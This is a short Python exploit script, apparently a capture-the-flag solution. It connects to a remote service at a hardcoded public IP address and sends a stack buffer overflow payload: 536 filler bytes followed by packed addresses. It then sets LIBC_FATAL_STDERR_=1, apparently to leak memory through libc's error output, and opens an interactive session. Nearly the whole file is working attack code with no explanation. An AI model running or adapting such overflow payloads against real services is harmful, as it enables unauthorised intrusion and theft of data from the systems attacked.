#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

#host = "10.211.55.16"
#port = 8888

host = "136.243.194.62"
port = 1024

sock = make_conn(host,port)


payload = 536*"a"
payload += pack(0x400d20)
payload += pack(0x600d20)
payload += pack(0x600d20)
recvuntil(sock,"name?")
sendline(sock,payload)
recvuntil(sock,":")
sendline(sock,"LIBC_FATAL_STDERR_=1")
inter(sock)
